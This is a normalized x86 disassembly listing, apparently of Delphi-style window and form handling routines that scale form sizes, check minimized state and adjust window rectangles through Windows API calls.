mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_442a48
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_442a08
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41c4c0
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41c514
jmp r-xdata
sub_41c638
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
push ebp
mov al 0x1
call sub_41c5bc
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42c7cc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
push ebp
xor eax eax
call sub_41c5bc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_430f60
sub_41c694
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
xor ebx ebx
mov [ ebp - 0x118 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c7fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448ef8
xor eax eax
push ebp
push sub_41c7da
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
mov eax [ ebp - 0x4 ]
call sub_44bfb8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_44c370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7e1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448f68
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2cc ] 0x1
xor eax eax
push ebp
push sub_41c7a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_43c174
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xfe
retn
lea edx [ ebp - 0x114 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x4
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
sub_41c824
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x21c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffb6
call sub_44c24c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xdf
sub_41c86c
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41b73c
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
mov [ eax + 0x40 ] edx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42bef4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42bf30
mov edx 0x140
mov eax [ ebp - 0x4 ]
call sub_42bf6c
mov edx 0xf0
mov eax [ ebp - 0x4 ]
call sub_42bfa8
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d71c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42cce0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42cbbc
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43491c
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x210 ] dl
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x213 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x219 ] 0x3
mov dl 0x1
mov eax [ r-xdata ]
call sub_4165cc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x228 ] eax
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_41d294
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22c ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x220 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_42b014
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x244 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21d ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44bfb8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4228c8
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ca15
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448ef8
mov eax [ ebp - 0x4 ]
call sub_4424d4
mov eax [ rw-data ]
mov eax [ eax + 0x70 ]
mov edx [ ebp - 0x4 ]
call sub_43c728
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43f930
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov edx [ eax ]
call [ edx + 0xc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x21c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_421544
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_41ca98
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_41cb62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x21c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448ef8
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41fb30
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422910
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
add eax 0x2c8
call sub_448fa8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_41b7c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb69
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448f68
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x9c ]
sub_41cb7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_41cbbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41d71c
sub_41cbc2
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4251dc
call sub_44c818
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41d71c
sub_41cbf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_41cc31
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41cc50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42f174
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x208 ] edx
mov eax [ ebp - 0x8 ]
mov bx 0xffbc
call sub_44c24c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f528
sub_41cca8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42bbcc
mov al [ ebp - 0x9 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c8 ]
call sub_43c264
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e66c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c8 ]
call sub_43c728
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e628
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e66c
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e5f0
sub_41ce10
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_41d03b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x254 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x258 ] edx
mov [ ebp - 0xd ] 0x0
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] al
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42fa30
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp - 0x4 ]
call sub_42c280
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x88 ] dl
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x254 ]
mov eax [ ebp - 0x4 ]
call sub_42c2d4
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x244 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d1ac
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx [ rw-data ]
cmp eax [ edx + 0x34 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_42df28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d042
mov eax [ ebp - 0x4 ]
call sub_430294
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41bdbc
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43408c
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41bdbc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43408c
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ec04
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ec20
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
sub_41d049
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42e330
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
push sub_41d188
mov eax [ ebp - 0x4 ]
mov cl [ eax + 0x4e ]
xor cl 0x1
mov edx r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41d140
mov eax [ ebp - 0x4 ]
push eax
push sub_41d164
mov eax [ ebp - 0x4 ]
mov cl [ eax + 0x4e ]
xor cl 0x1
mov edx r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d117
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_4400d4
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42cbbc
sub_41d140
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_440a78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_41d164
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d1ac
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_441fb0
pop ecx
pop ecx
pop ebp
retn
sub_41d188
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e880
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_441fb0
pop ecx
pop ecx
pop ebp
retn
sub_41d1ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e3f0
mov edx r-xdata
call sub_40fa30
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41d1ec
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bdbc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43408c
mov eax [ ebp - 0x4 ]
call sub_41d300
test al al
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ecd4
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ed00
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42c2b0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42c25c
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d67c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d6cc
sub_41d294
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fd2c
push eax
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SendMessageA
jmp r-xdata
sub_41d300
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d320
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41d320
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f8 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41d364
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e430
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x211 ]
sub al 0x2
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x1f8 ]
jne r-xdata
sub_41d3ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
sub_41d3e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_41d40c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_41d438
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434868
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call SetRect
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowLongA
push eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowLongA
push eax
mov eax [ ebp - 0x8 ]
push eax
call AdjustWindowRectEx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
sub edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
add edx [ eax + 0x4 ]
push edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
sub edx [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
add edx [ eax ]
push edx
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call SetRect
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41d4ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434eb8
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_442a48
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_442a08
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx 0xfff2
call sub_44c24c
test al al
jne r-xdata
sub_41d560
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_44bfb8
cmp ebx eax
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_41d5a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430844
sub [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_442a48
dec eax
test eax eax
jl r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434f0c
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc eax
